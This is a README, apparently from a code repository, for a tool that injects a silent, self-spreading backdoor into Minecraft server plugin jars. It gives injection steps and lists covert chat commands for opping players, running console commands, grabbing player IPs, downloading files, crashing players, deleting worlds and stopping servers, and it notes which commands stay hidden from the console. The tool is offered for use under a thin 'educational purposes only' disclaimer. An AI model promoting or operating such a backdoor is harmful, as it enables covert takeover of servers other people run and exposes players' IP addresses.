

# Thicc Industries Backdoor

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

For educational purposes only. Do not use on a server you do not own.

## Requirements:
* Java 8 runtime.
* Desired target plugin jar file.

## Usage instructions:
* Run backdoor-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: #)

## Commands
Default command prefix is ``#``,  this can be changed.
* #help - display all command, or description of command
* #op - op specified player
* #deop - deop specified player
* #ban - ban player with reason and source
* #banip - ip ban player with reason and source
* #gm - switch to specified gamemode
* #give - give the specified item in specified quantities
* #exec - exocute command as server console **[Visible]**
* #info - shows informatin about server
* #chaos - deop and ban ops, op all regular players, run this while not being op yourself **[Visible]**
* #seed - get the current world seed
* #sudo - sends messages as player
* #bcast - sends message as Server
* #rename - changes your nick
* #reload - Reloads the server **[Visible]**
* #getip - gets ip of the player
* #listwrld - displays all worlds
* #mkwrld - creates new world **[Visible]**
* #delwrld - deletes a world **[Visible]**
* #vanish - makes you vanish, tab included
* #silktouch - gives player silk touch hands
* #instabreak - let's player mine instantly
* #crash - crashes player's name
* #lock - locks the console or blocks player
* #unlock - unlocks the console or unblocks player
* #mute - mutes a player
* #unmute - unmutes a player
* #download - downloads a file
* #coords - get the coordinates of specified player
* #tp - teleport to specified coordinates **[Visible]**
* #stop - shutdown the server **[Visible, See below.]**

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
Other strange behavior may occur when teleporting extreme distances. (such as to the world border)

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
